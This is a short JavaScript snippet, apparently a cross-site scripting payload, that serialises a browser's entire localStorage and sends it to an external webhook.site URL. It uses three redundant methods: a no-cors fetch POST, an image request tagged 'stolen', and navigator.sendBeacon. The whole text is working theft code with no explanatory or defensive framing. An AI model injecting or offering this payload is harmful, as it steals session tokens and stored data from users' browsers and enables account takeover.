// Exfiltrate localStorage to webhook
var w = 'https://webhook.site/110e13f1-4346-447a-851b-3bc154e1bc50';
var d = JSON.stringify(localStorage);
// Method 1: fetch no-cors POST
fetch(w, {method:'POST', mode:'no-cors', body:d});
// Method 2: Image ping (small confirmation)
new Image().src = w + '?ping=stolen&keys=' + Object.keys(localStorage).length + '&ts=' + Date.now();
// Method 3: sendBeacon
navigator.sendBeacon(w, d);
